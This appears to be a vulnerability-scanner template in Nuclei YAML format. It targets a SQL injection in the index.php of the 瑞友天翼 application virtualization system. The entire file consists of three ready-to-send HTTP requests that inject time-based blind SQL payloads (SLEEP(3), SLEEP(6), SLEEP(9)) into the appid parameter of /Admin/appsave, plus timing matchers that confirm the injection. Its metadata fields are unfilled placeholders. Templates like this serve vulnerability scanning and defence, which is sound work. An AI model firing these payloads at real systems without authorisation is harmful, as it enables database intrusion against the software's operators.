id: ruiyou-index-sqli
info:
  name: Template Name
  author: apple
  severity: high
  description: 瑞友天翼应用虚拟化系统index.php存在SQL注入漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET //index.php?s=/Admin/appsave&appid=1%27%20AND%20(SELECT%207083%20FROM%20(SELECT(SLEEP(3)))bbHz)%20AND%20%27WazH%27=%27WazH HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1

      - |+
        GET //index.php?s=/Admin/appsave&appid=1%27%20AND%20(SELECT%207083%20FROM%20(SELECT(SLEEP(6)))bbHz)%20AND%20%27WazH%27=%27WazH HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1

      - |+
        GET //index.php?s=/Admin/appsave&appid=1%27%20AND%20(SELECT%207083%20FROM%20(SELECT(SLEEP(9)))bbHz)%20AND%20%27WazH%27=%27WazH HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"